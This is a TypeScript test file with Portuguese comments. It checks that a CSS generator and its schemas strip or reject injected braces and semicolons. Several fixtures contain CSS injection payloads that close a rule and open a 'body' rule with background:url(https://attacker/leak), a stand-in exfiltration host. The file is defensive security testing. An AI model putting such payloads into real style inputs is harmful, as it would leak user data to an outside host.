import { describe, expect, it } from 'bun:test'
import { CSSRuleSchema, KeyframesCSSSchema } from '#ir'
import { generateCSS } from '../css'

describe('generateCSS — defesa contra injeção (#18)', () => {
  it('descarta valor de declaração com chaves/; (não emenda uma 2ª regra)', () => {
    const css = generateCSS([
      {
        selector: '.alvo',
        declarations: {
          // Tentativa de exfil: fecha a regra e abre outra com background:url(...).
          color: 'red; } body { background:url(https://attacker/leak)',
          'font-size': '14px',
        },
      },
    ])
    // O valor malicioso é descartado por inteiro; a regra injetada não aparece.
    expect(css).not.toContain('attacker')
    expect(css).not.toContain('body {')
    // A declaração legítima sobrevive.
    expect(css).toContain('font-size: 14px;')
  })

  it('remove chaves de um seletor malicioso (não quebra a estrutura)', () => {
    const css = generateCSS([
      {
        selector: '.x { } body',
        declarations: { color: 'red' },
      },
    ])
    expect(css).not.toContain('{ } body')
    expect(css).toContain('color: red;')
  })

  it('sanitiza nome de @keyframes e seletor de passo (não quebra a estrutura)', () => {
    const css = generateCSS([
      {
        type: 'keyframes',
        name: 'girar } body { background:url(https://attacker/leak)',
        steps: [{ at: '0% } body {', declarations: { opacity: '1; } body { color:red' } }],
      },
    ])
    // As chaves do nome/passo são removidas → a injeção `} body {` some, então
    // nenhuma regra separada é aberta (o texto restante fica contido na cabeça
    // do @keyframes/passo, sem efeito de exfiltração).
    expect(css).not.toContain('} body {')
    // O VALOR de passo malicioso (com `;`/chaves) é descartado por inteiro.
    expect(css).not.toContain('color:red')
    expect(css).not.toContain('opacity: 1')
  })
})

describe('CSSRuleSchema — bloqueio durável de injeção (#18)', () => {
  it('rejeita seletor com chaves', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.x { } body',
      declarations: { color: 'red' },
    })
    expect(r.success).toBe(false)
  })

  it('rejeita valor de declaração com } ou ;', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.x',
      declarations: { color: 'red; } body { background:url(https://attacker/leak)' },
    })
    expect(r.success).toBe(false)
  })

  it('aceita regra legítima', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.card:last-child',
      declarations: { color: '#22d3ee', 'background-image': 'url(https://exemplo.com/a.png)' },
    })
    expect(r.success).toBe(true)
  })

  it('rejeita nome de @keyframes e passo com chaves', () => {
    const name = KeyframesCSSSchema.safeParse({
      type: 'keyframes',
      name: 'girar } body {',
      steps: [{ at: '0%', declarations: { opacity: '1' } }],
    })
    expect(name.success).toBe(false)

    const step = KeyframesCSSSchema.safeParse({
      type: 'keyframes',
      name: 'girar',
      steps: [{ at: '0% } body {', declarations: { opacity: '1' } }],
    })
    expect(step.success).toBe(false)
  })
})
